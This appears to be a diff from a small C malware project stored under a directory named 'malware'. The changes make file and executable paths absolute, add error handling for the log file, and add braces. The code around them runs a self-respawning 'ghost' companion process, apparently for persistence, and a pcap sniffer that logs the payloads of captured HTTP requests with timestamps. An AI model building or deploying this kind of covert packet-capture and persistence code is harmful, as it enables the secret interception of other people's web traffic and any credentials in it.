@@ -37,7 +37,14 @@ int main(int argc, char **argv)
     pthread_t aliver;
     pthread_create(&aliver, &attr, keep_ghost_alive, &id);
 
-    FILE *network_log = fopen("log/network.txt", "a");
+    FILE *network_log = fopen("/home/matgrioni/malware/log/network.txt", "a");
+    if (network_log == NULL)
+    {
+        printf("Error opening network log. Exiting...");
+        exit(1);
+    }
+    setbuf(network_log, NULL);
+
     struct loginfo info = { network_log, NEVER_WRITTEN, 4 };
 
     /* Variables for pcap sniffing, such as error buffer, device to be read
@@ -112,7 +119,7 @@ pid_t exec_ghost()
         sprintf(str_id, "%d", parent_id);
 
         printf("Starting ghost...\n");
-        execlp("./ghost", "./ghost", str_id, NULL);
+        execlp("/home/matgrioni/malware/./ghost", "./ghost", str_id, NULL);
     }
 
     return id;
@@ -145,9 +152,11 @@ void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_cha
     }
 
     if (p_size > 0)
+    {
         if (is_http_request(payload, p_size))
         {
             timestamped_write(info, payload);
             timestamped_write(info, "\n");
         }
+    }
 }
